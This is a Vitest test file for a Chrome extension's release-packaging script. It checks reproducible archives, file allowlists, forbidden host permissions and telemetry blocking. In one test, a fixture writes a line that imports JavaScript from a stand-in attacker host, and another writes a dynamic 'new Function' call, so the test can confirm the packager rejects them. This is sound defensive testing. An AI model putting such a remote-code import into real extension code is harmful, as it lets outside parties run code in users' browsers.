import { readFile, rm, writeFile, mkdir, mkdtemp } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import { createReleaseArchive } from "../package-release.mjs";

const roots = [];
const policy = {
  schemaVersion: 1,
  releaseChannel: "synthetic-default-dark",
  archivePrefix: "applydash-job-capture",
  allowedFiles: [
    "background.js",
    "manifest.json",
    "popup.css",
    "popup.html",
    "popup.js",
    "sidepanel.html",
  ],
  manifest: {
    name: "ApplyDash Job Capture (Default Dark)",
    requiredPermissions: ["activeTab", "alarms", "identity", "scripting", "sidePanel", "storage"],
    forbiddenPermissions: ["cookies", "history", "webRequest"],
    contentSecurityPolicy: "script-src 'self'; object-src 'self'",
  },
};

async function fixture() {
  const root = await mkdtemp(join(tmpdir(), "extension-package-test-"));
  roots.push(root);
  const dist = join(root, "dist");
  const firstOutput = join(root, "first");
  const secondOutput = join(root, "second");
  await mkdir(dist);
  const manifest = {
    manifest_version: 3,
    name: policy.manifest.name,
    version: "0.2.0",
    description: "Synthetic-only current-tab job capture and explicit contribution preview.",
    permissions: policy.manifest.requiredPermissions,
    background: { service_worker: "background.js", type: "module" },
    action: { default_popup: "popup.html" },
    content_security_policy: { extension_pages: policy.manifest.contentSecurityPolicy },
    side_panel: { default_path: "sidepanel.html" },
  };
  await Promise.all([
    writeFile(join(dist, "manifest.json"), `${JSON.stringify(manifest, null, 2)}\n`),
    writeFile(join(dist, "background.js"), "export const background = true;\n"),
    writeFile(join(dist, "popup.js"), "export const popup = true;\n"),
    writeFile(join(dist, "popup.css"), "body { color: #111; }\n"),
    writeFile(join(dist, "popup.html"), '<script type="module" src="popup.js"></script>\n'),
    writeFile(join(dist, "sidepanel.html"), '<script type="module" src="popup.js"></script>\n'),
  ]);
  return { dist, firstOutput, secondOutput, manifest };
}

afterEach(async () => {
  await Promise.all(roots.splice(0).map((root) => rm(root, { recursive: true, force: true })));
});

describe("extension release packaging", () => {
  it("creates byte-identical archives and sorted digest manifests", async () => {
    const { dist, firstOutput, secondOutput } = await fixture();
    const first = await createReleaseArchive({
      distDirectory: dist,
      outputDirectory: firstOutput,
      packageVersion: "0.2.0",
      policy,
    });
    const second = await createReleaseArchive({
      distDirectory: dist,
      outputDirectory: secondOutput,
      packageVersion: "0.2.0",
      policy,
    });
    expect(second).toEqual(first);
    expect(first.files.map((file) => file.name)).toEqual([...policy.allowedFiles].sort());
    expect(await readFile(join(firstOutput, first.archive.name))).toEqual(
      await readFile(join(secondOutput, second.archive.name)),
    );
  });

  it("rejects unexpected files and default-dark host permissions", async () => {
    const { dist, firstOutput, manifest } = await fixture();
    await writeFile(join(dist, "unexpected.txt"), "not reviewed\n");
    await expect(
      createReleaseArchive({
        distDirectory: dist,
        outputDirectory: firstOutput,
        packageVersion: "0.2.0",
        policy,
      }),
    ).rejects.toThrow("file allowlist");
    await rm(join(dist, "unexpected.txt"));
    await writeFile(
      join(dist, "manifest.json"),
      `${JSON.stringify({ ...manifest, host_permissions: ["https://example.test/*"] })}\n`,
    );
    await expect(
      createReleaseArchive({
        distDirectory: dist,
        outputDirectory: firstOutput,
        packageVersion: "0.2.0",
        policy,
      }),
    ).rejects.toThrow("cannot contain host permissions");
  });

  it("rejects remote executable JavaScript and dynamic code construction", async () => {
    const { dist, firstOutput } = await fixture();
    await writeFile(
      join(dist, "background.js"),
      'const module = import("https://attacker.example/remote.js");\n',
    );
    await expect(
      createReleaseArchive({
        distDirectory: dist,
        outputDirectory: firstOutput,
        packageVersion: "0.2.0",
        policy,
      }),
    ).rejects.toThrow("Remote executable JavaScript");

    await writeFile(join(dist, "background.js"), 'const execute = new Function("return 1");\n');
    await expect(
      createReleaseArchive({
        distDirectory: dist,
        outputDirectory: firstOutput,
        packageVersion: "0.2.0",
        policy,
      }),
    ).rejects.toThrow("Dynamic code construction");
  });

  it("rejects telemetry endpoints from the zero-telemetry release", async () => {
    const { dist, firstOutput } = await fixture();
    await writeFile(join(dist, "background.js"), 'fetch("https://sentry.io/api/report");\n');
    await expect(
      createReleaseArchive({
        distDirectory: dist,
        outputDirectory: firstOutput,
        packageVersion: "0.2.0",
        policy,
      }),
    ).rejects.toThrow("Telemetry endpoint");
  });
});
